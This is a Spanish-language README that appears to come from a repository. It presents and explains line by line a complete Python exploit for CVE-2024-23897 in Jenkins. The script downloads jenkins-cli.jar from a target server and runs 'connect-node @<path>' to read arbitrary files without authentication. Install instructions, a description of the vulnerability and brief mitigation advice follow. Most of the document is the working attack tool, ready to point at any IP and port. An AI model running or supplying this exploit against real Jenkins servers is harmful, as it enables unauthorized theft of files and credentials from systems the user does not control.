![banner](https://media.licdn.com/dms/image/C4E12AQEkzrSaJ9HXxw/article-cover_image-shrink_600_2000/0/1616222912932?e=2147483647&v=beta&t=1ajgdqhEyGB5hNuNW3nApYGLa5PY0xfMP2xnpcxtqek)

![img1](/img/Captura%20de%20pantalla%202024-08-08%20193515.png)

parametros  `ip` , `puerto` , `ruta`

![img2](/img/Captura%20de%20pantalla%202024-08-08%20194358.png)

**output del exploit**

![img3](/img/Captura%20de%20pantalla%202024-08-08%20194604.png)

**Panel de ayuda**

### explicacion del exploit

Aquí tienes la explicación del código en Markdown:

# Explicación del Código

Este script está diseñado para explotar una vulnerabilidad específica en Jenkins (CVE-2024-23897). Permite descargar un archivo JAR desde un servidor Jenkins y ejecutar un payload para conectar un nodo Jenkins. A continuación se explica cada parte del código:

## Importación de Módulos

```python
import argparse
import requests
import os
import subprocess
import sys
```

- `argparse`: Para manejar argumentos de línea de comandos.
- `requests`: Para hacer solicitudes HTTP.
- `os`: Para interactuar con el sistema operativo.
- `subprocess`: Para ejecutar comandos del sistema.
- `sys`: Para interactuar con el intérprete de Python.

## Función `banner`

```python
def banner():
    """
    Imprime un banner decorativo para la herramienta.
    """
    text = """
   ______     _______     ____   ___ ____  _  _        ____  _____  ___  ___ _____       _            _    _           
  / ___\ \   / / ____|   |___ \ / _ \___ \| || |      |___ \|___ / ( _ )/ _ \___  |     | | ___ _ __ | | _(_)_ __  ___ 
 | |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ __) | |_ \ / _ \ (_) | / /   _  | |/ _ \ '_ \| |/ / | '_ \/ __|
 | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____/ __/ ___) | (_) \__, |/ /   | |_| |  __/ | | |   <| | | | \__|
  \____|  \_/  |_____|   |_____|\___/_____|  |_|      |_____|____/ \___/  /_//_/     \___/ \___|_| |_|_|\_\_|_| |_|___/
 """
    print(text)
```

Esta función imprime un banner decorativo al inicio del script.

## Función `descargar_jar`

```python
def descargar_jar(ip, puerto):
    """
    Descarga el archivo jenkins-cli.jar desde el servidor Jenkins especificado.

    Args:
        ip (str): Dirección IP del servidor Jenkins.
        puerto (str): Puerto del servidor Jenkins.

    Returns:
        bool: True si la descarga fue exitosa, False en caso contrario.
    """
    url = f"http://{ip}:{puerto}/jnlpJars/jenkins-cli.jar"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open('jenkins-cli.jar', 'wb') as archivo_jar:
                archivo_jar.write(response.content)
            return True
        else:
            print(f"\n[-] No se pudo descargar el archivo. Código de estado: {response.status_code}")
            return False
    except requests.RequestException as errorhttp:
        print(f"\n[-] Error al realizar la solicitud: {errorhttp}")
        return False
```

Esta función descarga el archivo `jenkins-cli.jar` desde el servidor Jenkins especificado por la dirección IP y el puerto. Si la descarga es exitosa, guarda el archivo en el sistema y devuelve `True`; de lo contrario, devuelve `False`.

## Función `attack_payload`

```python
def attack_payload(ip, puerto, ruta):
    """
    Ejecuta el payload para conectar un nodo Jenkins.

    Args:
        ip (str): Dirección IP del servidor Jenkins.
        puerto (str): Puerto del servidor Jenkins.
        ruta (str): Ruta para leer el archivo.
    """
    archivo_jar = "jenkins-cli.jar"
    payload = f"java -jar {archivo_jar} -s http://{ip}:{puerto}/ -http connect-node @{ruta}"
    try:
        subprocess.run(payload, shell=True, check=True)
        os.remove(archivo_jar)
    except subprocess.CalledProcessError as error_payload:
        print(f"\n[-] Error al intentar conectar el nodo: {error_payload}\n")
```

Esta función ejecuta un comando para conectar un nodo Jenkins utilizando el archivo `jenkins-cli.jar`. Después de ejecutar el comando, elimina el archivo JAR. Si hay un error en la ejecución, muestra un mensaje de error.

## Función `main`

```python
def main():
    """
    Función principal que analiza los argumentos y ejecuta las funciones correspondientes.
    """
    parser = argparse.ArgumentParser(description="\n[+] Exploit para explotar el CVE-2024-23897\n")
    parser.add_argument("ip", type=str, help="\n[+] Dirección IP del servidor Jenkins\n")
    parser.add_argument("puerto", type=str, help="\n[+] Puerto del servidor de Jenkins\n")
    parser.add_argument("ruta", type=str, help="\n[+] Ruta para leer el archivo\n")
    args = parser.parse_args()

    ip = args.ip
    puerto = args.puerto
    ruta = args.ruta

    banner()

    if descargar_jar(ip, puerto):
        attack_payload(ip, puerto, ruta)
    else:
        sys.exit(1)
```

La función principal del script:
1. Analiza los argumentos de línea de comandos (`ip`, `puerto`, `ruta`).
2. Llama a la función `banner` para imprimir el banner.
3. Llama a la función `descargar_jar` para descargar el archivo JAR.
4. Si la descarga es exitosa, llama a la función `attack_payload` para ejecutar el payload; si no, finaliza el script con un código de salida `1`.

## Ejecución del Script

```python
if __name__ == '__main__':
    main()
```

Este bloque asegura que la función `main` se ejecute solo si el script se ejecuta directamente, no si se importa como módulo.

### Resumen

Este script es una herramienta para explotar una vulnerabilidad en Jenkins. Descarga un archivo JAR desde un servidor Jenkins y utiliza ese archivo para ejecutar un payload que conecta un nodo Jenkins. Los argumentos necesarios (`ip`, `puerto`, `ruta`) se proporcionan a través de la línea de comandos.



Aquí tienes una lista de las librerías necesarias junto con los comandos `pip install` para cada una:

# Librerías Necesarias

- `argparse`: Esta librería está incluida en la biblioteca estándar de Python, por lo que no necesitas instalarla.

- `requests`: Para hacer solicitudes HTTP.
  ```sh
  pip install requests
  ```

- `os`: Esta librería está incluida en la biblioteca estándar de Python, por lo que no necesitas instalarla.

- `subprocess`: Esta librería está incluida en la biblioteca estándar de Python, por lo que no necesitas instalarla.

- `sys`: Esta librería está incluida en la biblioteca estándar de Python, por lo que no necesitas instalarla.

# Instalación de Librerías

```sh
pip install requests
```









## El CVE-2024-23897 es una vulnerabilidad presente en Jenkins, una popular herramienta de automatización y CI/CD. Esta vulnerabilidad afecta a Jenkins en las versiones 2.441 y anteriores, así como a las versiones LTS 2.426.2 y anteriores. 

### Descripción de la vulnerabilidad:
- **Función afectada**: Analizador de comandos CLI de Jenkins.
- **Problema**: No deshabilita una función que permite reemplazar un carácter '@' seguido de una ruta de archivo en un argumento con el contenido de ese archivo.
- **Impacto**: Permite a atacantes no autenticados leer archivos arbitrarios en el sistema de archivos del controlador Jenkins.
- **Riesgo**: Un atacante puede acceder a información sensible almacenada en el servidor Jenkins, lo que podría llevar a comprometer aún más el sistema.

### Ejemplo de explotación:
1. Un atacante envía un comando CLI a Jenkins que incluye `@/ruta/del/archivo`.
2. El analizador de comandos de Jenkins interpreta `@/ruta/del/archivo` y reemplaza este argumento con el contenido del archivo especificado.
3. El atacante obtiene el contenido del archivo sin necesidad de autenticación.

### Medidas de mitigación:
- **Actualizar Jenkins**: Instalar versiones más recientes que hayan corregido esta vulnerabilidad.
- **Configuraciones de seguridad**: Revisar y restringir el acceso al CLI de Jenkins, asegurándose de que solo usuarios autenticados y de confianza puedan utilizar esta funcionalidad.
  
Actualizar y configurar adecuadamente Jenkins es crucial para proteger el sistema contra esta vulnerabilidad.


<div style="display: flex; align-items: center;">

![Python](https://img.shields.io/badge/Python-306998?style=for-the-badge&logo=python&logoColor=white)
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Tux.png" alt="Linux Icon" width="50" style="margin-right: 10px;"/>
</div>



